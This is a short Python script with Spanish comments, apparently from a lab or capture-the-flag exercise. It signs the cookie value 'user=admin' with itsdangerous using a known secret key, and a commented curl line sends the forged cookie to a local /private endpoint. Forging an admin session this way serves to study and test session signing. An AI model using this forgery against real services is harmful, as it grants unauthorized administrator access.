from itsdangerous import Signer

# Clave secreta utilizada por el servidor
secret_key = 'your_secret_key'

# Crear un firmador con la clave secreta
signer = Signer(secret_key)

# Datos de la cookie
cookie_value = 'user=admin'

# Firmar la cookie
signed_cookie = signer.sign(cookie_value)

print(f'Signed cookie: {signed_cookie.decode()}')

#curl -b "user=admin.XXXXXXXXXXXXXXXXXXXXXX" http://localhost:3000/private